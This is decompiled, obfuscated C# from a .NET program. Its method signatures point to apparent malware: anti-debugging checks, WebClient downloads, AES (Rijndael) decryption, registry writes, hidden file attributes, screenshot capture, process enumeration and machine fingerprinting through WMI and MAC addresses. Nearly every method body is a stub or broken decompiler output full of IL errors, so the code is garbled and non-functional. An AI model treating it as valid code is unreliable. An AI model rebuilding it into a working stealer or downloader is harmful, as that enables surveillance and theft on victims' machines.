using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

internal class Class5
{
	public static bool bool_0;

	public static bool bool_1;

	public static bool bool_2;

	public static bool bool_3;

	public static bool bool_4;

	public static string string_0;

	public static string string_1;

	private static readonly List<string> list_0;

	public static string string_2;

	public static string string_3;

	private static FileSystemWatcher fileSystemWatcher_0;

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_4);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_5);

	private static extern string smethod_0();

	public static extern string smethod_1(string string_4);

	private static extern void Main();

	private static void smethod_2()
	{
		//Discarded unreachable code: IL_0001
		/*Error: Unknown opcode: 0xF9*/;
	}

	private static extern bool smethod_3();

	private static extern bool smethod_4();

	private static extern bool smethod_5();

	private static string smethod_6()
	{
		//Discarded unreachable code: IL_0001, IL_0006, IL_0012, IL_001e
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Incompatible stack heights: 0 vs 1
		//IL_0022: Expected O, but got I4
		/*Error: Unknown opcode: 0xF9*/;
	}

	private static void smethod_7()
	{
		checked
		{
			_ = (ushort)/*Error near IL_0001: Stack underflow*/;
			/*Error: Unexpected end of block*/;
		}
	}

	private static extern void smethod_8(object sender, FileSystemEventArgs e);

	private static extern void smethod_9();

	public extern Class5();

	static extern string smethod_10(string string_4);

	static extern WebClient smethod_11();

	static extern string smethod_12(string string_4, string string_5);

	static extern void smethod_13(WebClient webClient_0, string string_4, string string_5);

	static extern void smethod_14(Component component_0);

	unsafe static Process smethod_15()
	{
		//Discarded unreachable code: IL_0011, IL_0017, IL_001e, IL_001f, IL_0026
		//IL_0021: Invalid comparison between Unknown and I4
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		/*Error: stloc 2 (out-of-bounds)*/;
		double num = ((double[])/*Error near IL_0002: Stack underflow*/)[/*Error near IL_0002: Stack underflow*/];
		_ = ((uint[])/*Error near IL_0003: Stack underflow*/)[num];
		checked
		{
			_ = (int)/*Error near IL_0005: Stack underflow*/;
		}
		_ = *(short*)3;
		/*Error near IL_000c: Invalid metadata token*/;
	}

	unsafe static ProcessStartInfo smethod_16()
	{
		//Discarded unreachable code: IL_0008
		//IL_0003: Expected I4, but got Unknown
		while (true)
		{
			_003F val = /*Error near IL_0001: ldloc 2 (out-of-bounds)*/;
			*(short*)(nint)/*Error near IL_0003: Stack underflow*/ = (short)(int)val;
		}
	}

	static extern void smethod_17(ProcessStartInfo processStartInfo_0, ProcessWindowStyle processWindowStyle_0);

	static extern void smethod_18(ProcessStartInfo processStartInfo_0, string string_4);

	static extern string smethod_19(string string_4, string string_5, string string_6);

	static extern void smethod_20(ProcessStartInfo processStartInfo_0, string string_4);

	static extern void smethod_21(Process process_0, ProcessStartInfo processStartInfo_0);

	static extern bool smethod_22(Process process_0);

	static extern void smethod_23(int int_0);

	static extern void smethod_24(string string_4);

	static extern string smethod_25(string string_4);

	static byte[] smethod_26(string string_4)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		_003F val;
		do
		{
			val = /*Error near IL_0001: Stack underflow*// /*Error near IL_0001: Stack underflow*/;
		}
		while (/*Error near IL_0006: Stack underflow*/ >= val);
		switch (/*Error near IL_000b: Stack underflow*/)
		{
		default:
			;
			break;
		}
		/*Error: Unexpected end of block*/;
	}

	static extern RijndaelManaged smethod_27();

	static extern void smethod_28(SymmetricAlgorithm symmetricAlgorithm_0, int int_0);

	static void smethod_29(SymmetricAlgorithm symmetricAlgorithm_0, int int_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		_ = /*Error near IL_0003: Stack underflow*/& 6;
		/*Error: Unexpected end of block*/;
	}

	static extern Encoding smethod_30();

	unsafe static byte[] smethod_31(Encoding encoding_0, string string_4)
	{
		_ = *(float*)(nint)/*Error near IL_0001: Stack underflow*/;
		/*Error near IL_0001: stloc 2 (out-of-bounds)*/;
		throw checked((int)/*Error near IL_0003: Stack underflow*/);
	}

	static extern void smethod_32(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0);

	static extern void smethod_33(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0);

	static extern void smethod_34(SymmetricAlgorithm symmetricAlgorithm_0, PaddingMode paddingMode_0);

	unsafe static void smethod_35(SymmetricAlgorithm symmetricAlgorithm_0, CipherMode cipherMode_0)
	{
		//Discarded unreachable code: IL_0011
		//IL_0004: Invalid comparison between Unknown and F4
		//IL_000b: Invalid comparison between Unknown and I4
		//IL_0012: Invalid comparison between Unknown and I4
		while (true)
		{
			float num = *(float*)(ulong)/*Error near IL_0002: Stack underflow*/;
			if (!((float)/*Error near IL_0009: Stack underflow*/ >= num))
			{
				ushort num2 = ((ushort[])/*Error near IL_000a: Stack underflow*/)[/*Error near IL_000a: Stack underflow*/];
				if ((int)/*Error near IL_0010: Stack underflow*/ < (int)num2)
				{
					break;
				}
			}
		}
		/*Error near IL_0010: Unknown opcode: 0xFB*/;
	}

	static byte[] smethod_36(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		//Discarded unreachable code: IL_000b, IL_0013, IL_001a, IL_0020, IL_002b, IL_0032, IL_0038
		//IL_0003: Unsupported input type for neg.
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got F8
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected I4, but got Unknown
		//IL_0026: Invalid comparison between Unknown and I4
		_ = (double)(uint)(short)(0 - ((object[])checked((uint)/*Error near IL_0001: Stack underflow*/))[3]);
		/*Error near IL_0006: Invalid metadata token*/;
	}

	static extern byte[] smethod_37(SymmetricAlgorithm symmetricAlgorithm_0);

	static extern ICryptoTransform smethod_38(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0, byte[] byte_1);

	static extern byte[] smethod_39(ICryptoTransform icryptoTransform_0, byte[] byte_0, int int_0, int int_1);

	static Encoding smethod_40()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			if (/*Error near IL_0001: Stack underflow*/ >> (int)/*Error near IL_0001: Stack underflow*/ == 0)
			{
				_003F val = /*Error near IL_0006: ldloc 2 (out-of-bounds)*/;
				if (/*Error near IL_000d: Stack underflow*/ <= val)
				{
					/*Error: Could not find block for branch target IL_000d*/;
				}
			}
		}
	}

	static extern string smethod_41(Encoding encoding_0, byte[] byte_0);

	static void smethod_42(IDisposable idisposable_0)
	{
		_ = ((double[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/];
		/*Error: Unexpected end of block*/;
	}

	static extern Assembly smethod_43();

	static extern string smethod_44(Assembly assembly_0);

	static extern void smethod_45(string string_4, string string_5, bool bool_5);

	static RegistryKey smethod_46(RegistryKey registryKey_0, string string_4, bool bool_5)
	{
		//Discarded unreachable code: IL_000a
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected I, but got Unknown
		//IL_0018: Expected F4, but got I4
		//IL_001a: Expected I4, but got F4
		/*Error: stloc 0 (out-of-bounds)*/;
		checked
		{
			_ = (byte)unchecked(/*Error near IL_0004: Stack underflow*/ / /*Error near IL_0004: Stack underflow*/);
			/*Error near IL_0005: Invalid metadata token*/;
		}
	}

	static extern void smethod_47(RegistryKey registryKey_0, string string_4, object object_0);

	static extern void smethod_48(string string_4, FileAttributes fileAttributes_0);

	static extern RegistryKey smethod_49(RegistryKey registryKey_0, string string_4);

	unsafe static void smethod_50(RegistryKey registryKey_0)
	{
		//Discarded unreachable code: IL_0012
		//IL_0007: Invalid comparison between Unknown and F8
		while (*(sbyte*)(nint)/*Error near IL_0001: Stack underflow*/ != (nint)registryKey_0)
		{
			double num = (double)/*Error near IL_0006: Stack underflow*/;
			if ((double)/*Error near IL_000c: Stack underflow*/ == num)
			{
				break;
			}
		}
		_ = *(float*)(nint)/*Error near IL_000d: Stack underflow*/;
		/*Error near IL_000d: Invalid metadata token*/;
	}

	static extern DialogResult smethod_51(string string_4, string string_5, MessageBoxButtons messageBoxButtons_0, MessageBoxIcon messageBoxIcon_0);

	static extern Rectangle smethod_52(Point point_0);

	static extern Bitmap smethod_53(int int_0, int int_1);

	static extern Graphics smethod_54(Image image_0);

	static extern void smethod_55(Graphics graphics_0, Point point_0, Point point_1, Size size_0);

	unsafe static ImageFormat smethod_56()
	{
		//Discarded unreachable code: IL_0008, IL_000c, IL_0011, IL_0015, IL_001d, IL_0022, IL_0036, IL_0040
		//IL_0005: Expected I8, but got I
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Incompatible stack heights: 0 vs 1
		//IL_0031: Incompatible stack heights: 0 vs 2
		nuint num = checked((nuint)(ushort)/*Error near IL_0001: Stack underflow*/);
		*(long*)(nint)/*Error near IL_0005: Stack underflow*/ = (nint)num;
		_ = (double)/*Error near IL_0006: Stack underflow*/;
		/*Error near IL_0007: Unknown opcode: 0xFB*/;
	}

	static extern void smethod_57(Image image_0, string string_4, ImageFormat imageFormat_0);

	static extern bool smethod_58(string string_4);

	static extern void smethod_59(Process process_0);

	static extern string[] smethod_60(string string_4, char[] char_0);

	static extern string smethod_61(WebClient webClient_0, string string_4);

	static extern string smethod_62();

	static string smethod_63()
	{
		while ((int)/*Error near IL_0005: Stack underflow*/ != 0)
		{
		}
		_ = 8;
		/*OpCode not supported: DebugBreak*/;
		/*Error near IL_0009: ldarga 0 (out-of-bounds)*/;
		/*Error: Unexpected end of block*/;
	}

	static extern string smethod_64(string[] string_4);

	static extern void smethod_65(string string_4, string string_5);

	static extern Process[] smethod_66();

	unsafe static string smethod_67(Process process_0)
	{
		//Discarded unreachable code: IL_0028, IL_002b, IL_0031, IL_003e
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Invalid comparison between Unknown and I8
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			_003F val = /*Error near IL_0001: Stack underflow*/* /*Error near IL_0001: Stack underflow*/;
			if (/*Error near IL_0006: Stack underflow*/ > val)
			{
				continue;
			}
			int num = *(int*)checked((nuint)/*Error near IL_0007: Stack underflow*/);
			_003F val2 = /*Error near IL_000b: Stack underflow*/- num;
			if (((byte[])/*Error near IL_000e: Stack underflow*/)[val2] >= (byte)process_0 && /*Error near IL_001c: Stack underflow*/< /*Error near IL_001c: Stack underflow*/)
			{
				long num2 = checked((long)/*Error near IL_001d: Stack underflow*/);
				if ((long)/*Error near IL_0022: Stack underflow*/ <= num2)
				{
					break;
				}
			}
		}
		/*Error near IL_0023: Invalid metadata token*/;
	}

	static extern void smethod_68(Process process_0);

	static extern Process smethod_69();

	static extern IntPtr smethod_70(Process process_0);

	static extern ManagementObjectSearcher smethod_71(string string_4);

	static ManagementObjectCollection smethod_72(ManagementObjectSearcher managementObjectSearcher_0)
	{
		//Discarded unreachable code: IL_000f, IL_0015
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			if ((nuint)unchecked((nint)null) <= unchecked((nuint)(-69)))
			{
			}
		}
	}

	static extern ManagementObjectEnumerator smethod_73(ManagementObjectCollection managementObjectCollection_0);

	static extern ManagementBaseObject smethod_74(ManagementObjectEnumerator managementObjectEnumerator_0);

	static extern object smethod_75(ManagementBaseObject managementBaseObject_0, string string_4);

	static extern string smethod_76(object object_0);

	static extern string smethod_77(string string_4);

	static extern bool smethod_78(string string_4, string string_5);

	static extern string smethod_79(string string_4);

	unsafe static bool smethod_80(string string_4, string string_5)
	{
		//Discarded unreachable code: IL_0024, IL_0029
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected F8, but got Unknown
		//IL_002b: Expected I8, but got I4
		while (true)
		{
			if (/*Error near IL_0005: Stack underflow*/ > /*Error near IL_0005: Stack underflow*/)
			{
				ushort num = checked((ushort)/*Error near IL_0007: Stack underflow*/);
				if (((IntPtr[])/*Error near IL_0008: Stack underflow*/)[num] == (IntPtr)0 && (int)/*Error near IL_0013: Stack underflow*/ == 0)
				{
					break;
				}
			}
		}
		ushort num2 = *(ushort*)(nint)/*Error near IL_0014: Stack underflow*/;
		*(ushort*)(nint)/*Error near IL_0015: Stack underflow*/ = num2;
		checked
		{
			uint num3 = (uint)/*Error near IL_001b: Stack underflow*/;
			_003F val = /*Error near IL_001d: Stack underflow*/- num3;
			((double[])/*Error near IL_001e: Stack underflow*/)[/*Error near IL_001e: Stack underflow*/] = (double)val;
			/*Error near IL_001f: Invalid metadata token*/;
		}
	}

	static extern bool smethod_81(ManagementObjectEnumerator managementObjectEnumerator_0);

	static extern NetworkInterface[] smethod_82();

	static extern OperationalStatus smethod_83(NetworkInterface networkInterface_0);

	static extern PhysicalAddress smethod_84(NetworkInterface networkInterface_0);

	static string smethod_85(string string_4, char[] char_0)
	{
		while (/*Error near IL_0006: Stack underflow*/ == /*Error near IL_0006: Stack underflow*/)
		{
		}
		/*Error near IL_0006: Invalid metadata token*/;
	}

	static FileSystemWatcher smethod_86()
	{
		return (FileSystemWatcher)/*Error near IL_0001: Stack underflow*/;
	}

	static extern string smethod_87(Environment.SpecialFolder specialFolder_0);

	static extern void smethod_88(FileSystemWatcher fileSystemWatcher_1, string string_4);

	static extern void smethod_89(FileSystemWatcher fileSystemWatcher_1, NotifyFilters notifyFilters_0);

	static extern void smethod_90(FileSystemWatcher fileSystemWatcher_1, string string_4);

	static extern void smethod_91(FileSystemWatcher fileSystemWatcher_1, FileSystemEventHandler fileSystemEventHandler_0);

	static void smethod_92(FileSystemWatcher fileSystemWatcher_1, bool bool_5)
	{
		//Discarded unreachable code: IL_000a, IL_0016, IL_001c
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Invalid comparison between Unknown and I
		//IL_001b: Expected F4, but got I4
		//IL_001c: Incompatible stack heights: 1 vs 0
		/*OpCode not supported: Ckfinite*/;
		_003F val = checked(/*Error near IL_0004: Stack underflow*/ - -102);
		_ = /*Error near IL_0005: Stack underflow*/>> (int)val;
		/*Error near IL_0005: Invalid metadata token*/;
	}

	static bool smethod_93(string string_4, string string_5)
	{
		//Discarded unreachable code: IL_0006, IL_000b, IL_0016, IL_001c, IL_0025, IL_002d
		//IL_0005: Expected F4, but got I4
		//IL_0014: Invalid comparison between Unknown and I4
		//IL_0020: Invalid comparison between Unknown and I4
		//IL_0020: Incompatible stack heights: 1 vs 0
		//IL_002d: Unsupported input type for neg.
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		((sbyte[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/] = (sbyte)/*Error near IL_0001: Stack underflow*/;
		uint num = checked((uint)/*Error near IL_0004: Stack underflow*/);
		((float[])/*Error near IL_0005: Stack underflow*/)[/*Error near IL_0005: Stack underflow*/] = (int)num;
		/*Error near IL_0005: Unknown opcode: 0xF9*/;
	}

	static extern byte[] smethod_94(string string_4);

	static Encoding smethod_95()
	{
		//IL_0000: Unsupported input type for neg.
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			_ = unchecked(0 - /*Error near IL_0001: Stack underflow*/) + 0;
			/*Error: Unexpected end of block*/;
		}
	}

	static extern int smethod_96(string string_4, string string_5);

	static extern string smethod_97(string string_4, int int_0, int int_1);

	static extern string smethod_98(string string_4, int int_0, string string_5);

	static extern void smethod_99(string string_4, byte[] byte_0);
}
